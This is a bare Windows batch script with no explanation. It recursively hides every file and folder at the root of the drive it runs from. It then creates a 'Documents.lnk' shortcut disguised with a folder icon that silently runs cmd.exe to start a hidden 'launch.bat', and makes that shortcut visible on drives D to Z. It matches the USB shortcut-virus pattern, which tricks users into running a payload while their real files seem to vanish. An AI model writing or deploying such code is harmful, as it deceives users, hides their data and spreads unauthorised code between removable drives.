echo off
set "drive=%~d0"
cd /d "%drive%\"

attrib +h +s *.* /s /d

powershell -Command ^
  "$s=(New-Object -COM WScript.Shell).CreateShortcut('%drive%\Documents.lnk'); $s.TargetPath='%SystemRoot%\System32\cmd.exe'; $s.Arguments='/c start /min launch.bat'; $s.IconLocation='%SystemRoot%\System32\shell32.dll,3'; $s.Save()"

for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist "%%d:\" (
        attrib -h -s "%%d:\Documents.lnk"
    )
)
exit